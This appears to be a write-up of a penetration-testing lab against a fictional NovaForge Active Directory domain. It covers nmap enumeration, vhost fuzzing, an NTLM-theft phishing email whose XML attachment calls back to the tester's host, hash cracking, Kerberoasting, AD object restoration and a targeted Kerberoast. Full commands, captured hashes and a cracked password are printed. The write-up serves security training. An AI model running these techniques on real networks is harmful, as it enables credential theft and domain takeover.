
# Objective and scope
NovaForge delivers enterprise software, intelligent automation, and internal management platforms targeted towards mid-sized companies. They have hired Hack Smarter to perform an internal network penetration test, with a special focus on Active Directory.

Your task is to enumerate the network and see if you can fully compromise the domain.

The client has provided you with VPN access to their network, but no credentials.

# Host file setup
```python
sudo nxc smb 10.0.0.100 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## DC
### Open ports
```python
nmap -p- --min-rate=2000 -sT dc.novaforge.local                                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:26 +0100
Nmap scan report for dc.novaforge.local (10.0.0.100)
Host is up (0.094s latency).
rDNS record for 10.0.0.100: DC.novaforge.local
Not shown: 65504 closed tcp ports (conn-refused)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
587/tcp   open  submission
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49693/tcp open  unknown
49697/tcp open  unknown
49709/tcp open  unknown
49714/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.62 seconds
```

### Nmap
```python
nmap -p 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT dc.novaforge.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:28 +0100
Nmap scan report for dc.novaforge.local (10.0.0.100)
Host is up (0.095s latency).
rDNS record for 10.0.0.100: DC.novaforge.local

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: NovaForge | Dark Enterprise Suite \xE2\x80\x94 Video Loop
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-06 15:28:25Z)
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 IMAP4 CAPABILITY NAMESPACE IDLE OK CHILDREN completed RIGHTS=texkA0001 ACL QUOTA SORT
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novaforge.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: novaforge.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: NOVAFORGE
|   NetBIOS_Domain_Name: NOVAFORGE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novaforge.local
|   DNS_Computer_Name: DC.novaforge.local
|   DNS_Tree_Name: novaforge.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T15:28:46+00:00
| ssl-cert: Subject: commonName=DC.novaforge.local
| Not valid before: 2026-06-18T23:09:56
|_Not valid after:  2026-12-18T23:09:56
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/6%Time=6A74A81E%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 11 24H2 (94%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (94%), Microsoft Windows Server 2016 (93%), Microsoft Windows 11 24H2 - 25H2 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Some interesting services running!

## Storage server
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.0.101 -Pn                                                                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:35 +0100
Nmap scan report for 10.0.0.101
Host is up (0.094s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 66.23 seconds
```

### Nmap
```python
nmap -p 135,445,3389,5985 -A --min-rate=2000 -sT 10.0.0.101 -Pn         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:38 +0100
Nmap scan report for 10.0.0.101
Host is up (0.095s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=STORAGE.novaforge.local
| Not valid before: 2026-06-18T14:30:14
|_Not valid after:  2026-12-18T14:30:14
| rdp-ntlm-info: 
|   Target_Name: NOVAFORGE
|   NetBIOS_Domain_Name: NOVAFORGE
|   NetBIOS_Computer_Name: STORAGE
|   DNS_Domain_Name: novaforge.local
|   DNS_Computer_Name: STORAGE.novaforge.local
|   DNS_Tree_Name: novaforge.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T15:39:10+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/6%Time=6A74AA90%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I cant do anything with SMB on the storage server, null auth is disabled since this isnt a DC and also the guest account is disabled!

# Domain Controller

So since im sure at this point the initial access is via the DC ill start here.

## SMB (445)
On the DC, null auth is enabled as with all DCs but cannot use it to enumerate shares or users

The guest account is also disabled!

## SMTP (25)

https://medium.com/@rajkumarkumawat/%EF%B8%8Fsmtp-enumeration-the-ethical-hackers-guide-to-uncovering-email-vulnerabilities-efc85ae0a563

```python
nc -vn 10.0.0.100 25        
(UNKNOWN) [10.0.0.100] 25 (smtp) open
220 DC ESMTP
```

> DC ESMTP (Data Center Extended Simple Mail Transfer Protocol) is a specialized mail transfer protocol configuration optimized for high-volume, high-throughput email delivery within and between data center environments. It builds upon standard ESMTP extensions to handle massive email traffic efficiently while ensuring security and reliability.

I cannot use `VRFY` to validate usernames

## HTTP (80)
There is no links on the main page of the website

No hidden endpoints!

Nuclei didnt find anything!

### Ffuf for vhosts
```python
ffuf -u http://novaforge.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.novaforge.local' -ic -c -t 30 -fs 29073

intranet                [Status: 200, Size: 34525, Words: 6056, Lines: 792, Duration: 103ms]
jobs                    [Status: 200, Size: 34058, Words: 4399, Lines: 355, Duration: 100ms]
```

Found two subdomains!

# `intranet` subdomain

![](Pasted%20image%2020260806172914.png)

![](Pasted%20image%2020260806172934.png)

![](Pasted%20image%2020260806172955.png)

Found some users and also an alert for phishing emails via .xml files

![](Pasted%20image%2020260806173340.png)

![](Pasted%20image%2020260806173507.png)

# `jobs` subdomain

![](Pasted%20image%2020260806173035.png)

Found a user `john.doe`

Its also safe to assume that the employee emily zhou found on the other subdomain is `emily.zhou` based on this info on `john.doe`

![](Pasted%20image%2020260806173146.png)

Also gives me a hint on what files are allowed

Based on the landing screen for this subdomain my next step is to try and phish the `john.doe` user with an xml file!

# User compromise via phishing

```python
python3 ntlm_theft.py -g all -s 192.168.211.2 -f resume
/home/kali/hsm/novaforge/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: resume/resume.scf (BROWSE TO FOLDER)
Created: resume/resume-(url).url (BROWSE TO FOLDER)
Created: resume/resume-(icon).url (BROWSE TO FOLDER)
Created: resume/resume.lnk (BROWSE TO FOLDER)
Created: resume/resume.rtf (OPEN)
Created: resume/resume-(stylesheet).xml (OPEN)
Created: resume/resume-(fulldocx).xml (OPEN)
Created: resume/resume.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: resume/resume-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: resume/resume-(includepicture).docx (OPEN)
Created: resume/resume-(remotetemplate).docx (OPEN)
Created: resume/resume-(frameset).docx (OPEN)
Created: resume/resume-(externalcell).xlsx (OPEN)
Created: resume/resume.wax (OPEN)
Created: resume/resume.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: resume/resume.asx (OPEN)
Created: resume/resume.jnlp (OPEN)
Created: resume/resume.application (DOWNLOAD AND OPEN)
Created: resume/resume.pdf (OPEN AND ALLOW)
Created: resume/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: resume/resume.library-ms (BROWSE TO FOLDER)
Created: resume/Autorun.inf (BROWSE TO FOLDER)
Created: resume/desktop.ini (BROWSE TO FOLDER)
Created: resume/resume.theme (THEME TO INSTALL
Generation Complete.
```

Ill use ntlm theft to generate the xml file

```python
sudo responer -I tun0
```

Then start responder

```python
sendEmail -f attacker@kali.com -t john.doe@novaforge.local -u 'Job Application' -m 'Here is my resume' -a 'resume-(stylesheet).xml' -s dc.novaforge.local:25
Aug 06 17:50:09 kali sendEmail[34425]: Email was sent successfully!
```

Then ill send the email

```python
[SMB] NTLMv2-SSP Client   : 10.0.0.100
[SMB] NTLMv2-SSP Username : NOVAFORGE\john.doe
[SMB] NTLMv2-SSP Hash     : john.doe::NOVAFORGE:fec2858bc2db6aec:E88119BEDF0BD2659D55A94768AC1FBB:01010000000000008058C0B0CA25DD010B53588D79BC6F89000000000200080053004C004900530001001E00570049004E002D004A005000460034004500560048003500420043004F0004003400570049004E002D004A005000460034004500560048003500420043004F002E0053004C00490053002E004C004F00430041004C000300140053004C00490053002E004C004F00430041004C000500140053004C00490053002E004C004F00430041004C00070008008058C0B0CA25DD01060004000200000008005000500000000000000001000000002000009FB85AC8C5991EC9CA1487B38BE69F818483FF43A7C21745922ACCC72FE1E28DF4509DC7352CBD6841F45895828D349CAE3610F2294F8CFAD5FD5A6AFDA1AF9F0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

Now i have his hash!

```python
hashcat johndoe.hash /usr/share/wordlists/rockyou.txt

JOHN.DOE::NOVAFORGE:fec2858bc2db6aec:e88119bedf0bd2659d55a94768ac1fbb:01010000000000008058c0b0ca25dd010b53588d79bc6f89000000000200080053004c004900530001001e00570049004e002d004a005000460034004500560048003500420043004f0004003400570049004e002d004a005000460034004500560048003500420043004f002e0053004c00490053002e004c004f00430041004c000300140053004c00490053002e004c004f00430041004c000500140053004c00490053002e004c004f00430041004c00070008008058c0b0ca25dd01060004000200000008005000500000000000000001000000002000009fb85ac8c5991ec9ca1487b38be69f818483ff43a7c21745922accc72fe1e28df4509dc7352cbd6841f45895828d349cae3610f2294f8cfad5fd5a6afda1af9f0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003200310031002e0032000000000000000000:johndoe1369
```

The hash cracked

```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5                           
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369
```

This user is now compromised!

# Enumeration as `john.doe`

## SMB shares
```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --shares
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369 
SMB         10.0.0.100      445    DC               [*] Enumerated shares
SMB         10.0.0.100      445    DC               Share           Permissions     Remark
SMB         10.0.0.100      445    DC               -----           -----------     ------
SMB         10.0.0.100      445    DC               ADMIN$                          Remote Admin
SMB         10.0.0.100      445    DC               C$                              Default share
SMB         10.0.0.100      445    DC               IPC$            READ            Remote IPC
SMB         10.0.0.100      445    DC               NETLOGON        READ            Logon server share 
SMB         10.0.0.100      445    DC               SYSVOL          READ            Logon server share
```

Default access on the shares

## Dumping users
```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
john.mitchell
david.parker
ryan.collins
michael.turner
jessica.morgan
emily.carter
daniel.brooks
alex.hughes
frank.white
svc_it_admin
david.cokx
john.doe
steve.wills
chuck.harrys
inbox
steve.miller
ethan.wright
olivia.bennett
noah.sanders
liam.harrison
STORAGE$
```

Ive dumped them all to a user file!

This user does not have access to WINRM or RDP on the DC

## BloodyAD get writable
```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u 'john.doe' -p 'johndoe1369' get writable

distinguishedName: CN=Users,DC=novaforge,DC=local
permission: CREATE_CHILD

distinguishedName: CN=Deleted Objects,DC=novaforge,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=john.doe,CN=Users,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=m.lee\0ADEL:93ec6349-1919-424f-963c-5971a8832f62,CN=Deleted Objects,DC=novaforge,DC=local
permission: WRITE

distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
permission: CREATE_CHILD
```

Looks like this user has WriteOwner on the Deleted objects, something to keep in mind!

# Kerberoasting

```python
nxc ldap dc.novaforge.local -u john.doe -p 'johndoe1369' --kerberoasting kerb.hash                                                                               
LDAP        10.0.0.100      389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:novaforge.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.0.100      389    DC               [+] novaforge.local\john.doe:johndoe1369 
LDAP        10.0.0.100      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.0.100      389    DC               [*] Total of records returned 1
LDAP        10.0.0.100      389    DC               [*] sAMAccountName: svc_it_admin, memberOf: CN=Protected Users,CN=Users,DC=novaforge,DC=local, pwdLastSet: 2026-06-20 00:17:08.000373, lastLogon: <never>
LDAP        10.0.0.100      389    DC               $krb5tgs$18$svc_it_admin$NOVAFORGE.LOCAL$*novaforge.local\svc_it_admin*$3a171d93b44b7bc7546249c9$001e093c69fc068e92ce4ac74443d34f9cd35617acd64ae6b808278951cf645c1ddc3ca2f66cef7bc7d1d6a8199e1a315c33e7deb46a5a435d01b64b5f0e767879acf33a7209deaccebdfde23141a0dd8679f03b598d350581fd33879a7998f6e207f2a1e63c6ae48ff983dfee5c6606672cba22b277a8153743110f8d4389909d4b31564d26054a7cecc4788b6cb31f2119d75cf974bec17b3e90ba1bbc95470c83fb3f3596f79cf7afcfcc9624cfc7cf291c418d4eaa28561cb4e6f68261eb2f0a810fb890420d7f021262e6826d7102d52d651e00a7686109dba8c85d1d698ce796189753748690fee75544a6120501bf353f450dfd773707fdea90ba5ccb2b15e012844a006b7f8ea83b56e46e3adaa73adefc73e050b73a1873ccf0a36f88555cd76c1f91ad9f560a756dccb0663d687911c1d49f584653e74456b7ce4fbd80f23465a6dcc34f829a76d149f0b8ef2bcea29de246cb795a3f26b27aa9ca48ed030af38dc9f2fa6b3e5a5d331224fc76da8dad4391615406810a65fa3a20586e0e3cb89ad0492d76cfa77ea0304682832e7f012e31acd32e8813b59d51fb97375976308a3331c8625dbee2b6fd8637793f60935bb9c348679eeb26700c857851c61c7ff3edb5cca41456b5afafc02b578a2414e14ddd47425d0ff3cc6cf81ae728292039c13df255b25db7689035871172bc1f43e017ed2c9028304f4080d8bcb57e3680da34f586640230bbdbd443206c819c60a1d6ae125ff07b71378a95b79a6bfc98451346dee4802b51d9e61e6d4dd5e096a08cbdb390cda747a084ce14e2b8be4ceaf4ba7e64e8edba5eed45766976e01c80f57a286c919f2294088115c69b188930027f741b3fe3abd60e4b7593e84137ffc0b3af25632d0940c15e39e0f75add5e0855e692d6cb954ab9e9eb2e7db5906626a78c6c61a20822be8cc42962a8931615ebb1735d8d4babc0b1f6cbc8eef5d63ea03ef86e556b5f618250d54e2731dfb90db36d9ae088d555a6a37d550afd22ba7f8509f5ae77c56f5244d629290d74aa40555bb9e022dd5d553f3b0c60f6be07a7fcdbd25456421f846071c41d6db0df9cd77d4180b92b957d55fce651f39c2916b6baa69442da1ab9733179afdb6d6606de3ae4096036e36e8ce9102ae7c00a35121a4f466001df19d8b8fe83eb7c999ea2c46550505e4a544ec41d8290de95ef2501c463927999e6de06883b36a9fd98b8ff9f5d255338424a085297605523a1d42c1b05c76250fad5672db452b90b72769f752a35562ca58dfb26fdf2252cb9db4c638c37eec9769b7ebf1fab18b85731af1337c5b344f2ecdc6db64413fe5071948aaaf95b2ea772c744c2e5065e346c7fa3d56f9899e9ae7239cc640ab3ccf09a19cae6408eed67ab9bc1a640e19ac380099df544e65144ab4ca3cd9eba0a3beabf25cdb86a6ea046b1cd004c0b506deaa01ab92f996c7f8369afeec7f6607f26b1e3d3eda525f9193b6209479f
```

This users hash cannot be cracked however

# Access on `storage.novaforge.local`

```python
nxc smb storage.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --shares
SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\john.doe:johndoe1369 
SMB         10.0.0.101      445    STORAGE          [*] Enumerated shares
SMB         10.0.0.101      445    STORAGE          Share           Permissions     Remark
SMB         10.0.0.101      445    STORAGE          -----           -----------     ------
SMB         10.0.0.101      445    STORAGE          ADMIN$                          Remote Admin
SMB         10.0.0.101      445    STORAGE          C$                              Default share
SMB         10.0.0.101      445    STORAGE          IPC$            READ            Remote IPC
SMB         10.0.0.101      445    STORAGE          Shared          READ
```

I have read access on the `Shared` share

```python
impacket-smbclient novaforge.local/john.doe:'johndoe1369'@storage.novaforge.local
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
IPC$                      IPC (SPECIAL)   Remote IPC
Shared                    DISK            
# use Shared
# ls
drw-rw-rw-          0  Sat Jun 20 16:30:40 2026 .
drw-rw-rw-          0  Sat Jun 20 01:14:08 2026 ..
-rw-rw-rw-    3205143  Sat Jun 20 16:30:40 2026 NovaForge Browser Security Policy.pdf
-rw-rw-rw-     415889  Fri Jun 19 15:35:23 2026 StorageAccessOverview.pdf
# mget *
[*] Downloading NovaForge Browser Security Policy.pdf
[*] Downloading StorageAccessOverview.pdf
# 
```

Found two .pdf files

![670](Pasted%20image%2020260806180840.png)

Looks like there is an internal web service!

![462](Pasted%20image%2020260806181058.png)

So ive found some user role info and also info on an internal service, also some info about the staff only using opera gx browser, so might be able to dump credentials from it!

I think the next step is to collect bloodhound data!

# Bloodhound

There is nothing in bloodhound of interest with the user `john.doe`

# Restoring the `m.lee` object using `john.doe`

So i cannot restore the user `m.lee` using `john.doe` credentials instead ill generate a tgt for the user then restore the object using kerberos authentication

```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --generate-tgt johndoe
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369 
SMB         10.0.0.100      445    DC               [+] TGT saved to: johndoe.ccache
SMB         10.0.0.100      445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=johndoe.ccache
```

First ill get the TGT

```python
export KRB5CCNAME=johndoe.ccache
```

Then ill export

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -k set restore 'm.lee' 
[+] m.lee has been restored successfully under CN=m.lee,CN=Users,DC=novaforge,DC=local
```

Now the object is restored!

To map out the privileges easier i will now re collect bloodhound data now the object is restored!

# Compromising `m.lee`

![](Pasted%20image%2020260807174812.png)

Just as i thought, this user has GenericWrite on this user, which means i can either abuse shadow credentials or a targeted kerberoast!

## Targeted Kerberoast

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u john.doe -p 'johndoe1369' set object 'm.lee' servicePrincipalName -v 'service/hacked'
[+] m.lee's servicePrincipalName has been updated
```

First ill add an SPN to the account

```python
nxc ldap dc.novaforge.local -u john.doe -p 'johndoe1369' --kerberoasting kerb.hash            
LDAP        10.0.0.100      389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:novaforge.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.0.100      389    DC               [+] novaforge.local\john.doe:johndoe1369 
LDAP        10.0.0.100      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.0.100      389    DC               [*] Total of records returned 2
LDAP        10.0.0.100      389    DC               [*] sAMAccountName: svc_it_admin, memberOf: CN=Protected Users,CN=Users,DC=novaforge,DC=local, pwdLastSet: 2026-06-20 00:17:08.000373, lastLogon: <never>
LDAP        10.0.0.100      389    DC               $krb5tgs$18$svc_it_admin$NOVAFORGE.LOCAL$*novaforge.local\svc_it_admin*$91322cdb0977ae614210e0bb$031d4b96af14e88a1e774a891be76e204800139682dd4a2c268631e126654e7ea3d4d82d8fba1b9ec24c618375224f12a92c03e3c79a203d248a64b715cbd7766ff1b84b47278190b514f74b655c9d190afac17360a3876af0e2985b7db829ea667986d0db3ff99df691c09d9a6832f73b4fb9c327bee42b6ea63583d55f87e2dd0e286e04b0dc92bc41c8968182a15e23d7f42fc5e85510cebad9a4895a07a906874d84478f9fe10b5a4330fae65d23fd3c3d0c99de51e4b2794868b6dfa5fd3d4c03ee6920850bec998ed193d971dfe42660a4e5ddae26b28a970e5095023eab0f1c431d7d6f2be793fabefec94039903398c57eaceb05c07b30ce54a22219857b61ba95aa889aa979ca5d9d3c4f5472e5596cc8267ac722eb55f457c3b39d9acce46f684e44f0e16d65ec3f0428c1d283dc86a9725db15554fa9c3049bbf1c1c2b58b1e82d8dc77d95ef8f32d223720da0a229dd1d4b18bc28bcb2aa29b5873f4036121bd9954aaf045a184d8ab2a784f4b88cd9dbfe63a9805a726dee99a6bbf0aa8a2d7a2e6f97fa2cf91b9723c4b0a595496bbac36a1e5f2675f5d84ebfc946e9ce55d7df94d9c9e3b8eb109d7bfae0071570188b38ea46ab4ccf19c4ecd4dc28df41e4f08145de1ab0c5cf4e57995fc047f4133cc357423775623b8391bb6c961c4581fa38dc98797469809ad737aa441437a47ac7b24469efdef8cbfd0799d4c7fa985cd288bdeb529afee55595378878b1ab30b1c64302d2aeb35091dfa0a79c769ed96808bae04793270b75f08ee0af5c5135ba2050909188ea68510825535f3540dc437c4990c1fca71305822d9b128dee16449656660ff7e7c18025774b7f14f576297e4c411f8c36c40479b2f94ccd5485e87b863077022adbf62ae95c610d6ef5b9d3a0b2c10cff56ffeb833feb12c036ce97d5e50a9c3f16e3369cca9f715acaec101d92715ac07a121e0b55309cd5cb27b4a8a30310c552eb875f255d53fa8345bc8a5aa041f323f8c073d48d4112132e3aa2adfd6174a6bf6b8a13084508412c6175166827bf4484e892cecf43c8181f60a6859495aabf42bbab00608d533eff663805b637feb00a0a669ba428453c0f19889826780979e485e9684b3da0abe93de14b7525ec2d5989010d879cc7d53cf3b0fb6470406f9c099cd564ef58bbbd3cc4a396e7828e55cc390280eb6546bb18d4e42be84d37ae6ce047e095d72593e9f76c51c0577ba713012783b96edf0713f7879eaeeb62103439dd7283cf7b69aa92b1fac9100970b3f722825deddc32db9994405c480251093223144208c00f8ed6aef7d7beff7a8bbcc56089d4c24219df5ec3b2f7e07804b09ee86d595588e72279b86ba0583c18f7010c66d32cf132f46580e22be9c76f8f24fdcaf19b591085d465462a4ab7b23995703300fcdd9e7b427830c5920b9a9e2f792074db203e63b37fb85d208fe48044f3108c2b648cfb8fbb5e2f4e0c34b1d1c13e50219
LDAP        10.0.0.100      389    DC               [*] sAMAccountName: m.lee, memberOf: [], pwdLastSet: 2026-06-20 11:34:08.435707, lastLogon: <never>
LDAP        10.0.0.100      389    DC               $krb5tgs$18$m.lee$NOVAFORGE.LOCAL$*novaforge.local\m.lee*$46a4b59908a990b322d90af7$daa220e53c28a7020e8aaf8456a08d9bec654dd22f4f3d2a7ed6d12d5b3728bc40eb354e135b67836b1efe56dc8c7279d591bae5f61a153b4491d9111cef3dacd442df198b5c105e350ee6840123a53fa1fc440b76bbacf7b96b22880b8163bc782d0bc3278510fd9a8217867c0a55fe246e0fead46ad0cdd3834efa57cc0495bdf54cbfc08a9dce8a75d844d178da9f1874f5ca3862aa37077887a4a3e6be5f927a041e91d4ee6fd2148a5eb01bdc35e2b2ff369ac633e5e24a1439652414d4bef41d3766028ccaaa186e99c3dc92cf575905c070de4e841698f0b767a98a4f5350304b7e478c1f54845bd4598fe41272cbaa9ba78aa5c4ffb833903e25858612c9a2d1ced51d94816066b13c022fc706545a409d56d808ea746137fce3d2ebcc68517cfff7f9ceb6303dc6ff5db121635c1c88ed3edb9a31785ec1af6f404fffe278444714d2c6811130f80894b1d30fb7709eebbd0ede8e203f6ba75553c1890e410b1822d0bb04a82ee126f0854f5e9e2a411ad5386ebfff02877f7db1e577c2a62856ce9713a626ece53d3dc13a9202f2041154e16d2f81106f896b0776603b04e3f262f245d89822b0249c7c562a9370feea49002ef9f2238aa8e86b2bfce8d383a453b9099eef256e3e075e8de88281d110cf7bfc41fc42f4012569f63c04d3a045126eca6731fa00b0dd57f630f80b97e1e54114ee833cd1281930894b832dc389c523cb8f80beda2ee28ea2d120a56ca3e479475dacfd70ca49f71833cbe6df510a4682e1c760870006be7c68bafabbf005fd06361645f225eefec4141936ee1ebf6a7ff94a58160879ab25c3d4f8f3caefafc7174780f7cd1d24ce46d385ffe5b35007b16651170526e23edbb2d2780af10fd6420bd69ba7f70b504ef6c7a1491faca383c6c0ea304de37d489b1219aa8e730b544d044440c37379a0b873c5d33ecc0a96143ccb730a12485ba9dc527493c0a54447ee1e599df16a6f08b922031065c544e6c5c80369950ae5e904356d935762f949f06579ea09f1ee2cc00e28298eb841787f48e724efc5ac9b164ae047d821672c6a8d50102b6209a455e4c3cb9203cf5704daa9524fdc60c1aaab5edbc5ad16fb54c7f12c55fb9d56ad8b4f3324040a609678d4a0704717e9071809883c19beba4923b8d6a1863c30a6464acafc702cdd989358e1021ee1883d08c362e60ef6b8d9b29b3cc8bc2c81d50871f254bf9025f74b81c9fb06b4f827fba03810e2018dd8aa895184962df55dd9140aaf47bc6ff1637a867cf4bba26cc3a31b654eb175a0f50e9c42d0c5210a7ce97bc8f1b9fa65270d935b4a599a45f542518da5957a5585f3cacf7d63c22a49299e6f7c48011744de460d8c78d6dcfe8efed63fd08653bbc2d07ff96a3948924f087773cbc998437860092aaac0634b20bac035c8ddc6e8ccebeea0d65887a09bd9561df93b6e36e31c5bfa088a2337ee030e143907e0d7c119732b1b60f446dccc992a
```

